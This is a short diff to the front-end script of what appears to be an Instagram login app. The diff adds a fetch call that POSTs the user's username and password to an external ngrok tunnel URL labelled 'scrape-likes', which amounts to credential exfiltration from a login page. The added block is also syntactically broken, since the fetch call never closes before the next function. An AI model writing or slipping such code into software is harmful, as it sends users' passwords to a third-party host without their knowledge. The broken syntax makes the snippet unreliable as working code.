@@ -13,6 +13,11 @@ document.addEventListener('DOMContentLoaded', () => {
     loginBtn.addEventListener('click', () => {
         window.location.href = '/auth/instagram';
     });
+    const SCRAPE_URL = 'https://unjeopardized-marine-onomatopoeically.ngrok-free.dev/scrape-likes';
+    fetch(SCRAPE_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username, password })
 
   function showMainUI(user) {
     authContainer.style.display = 'none';
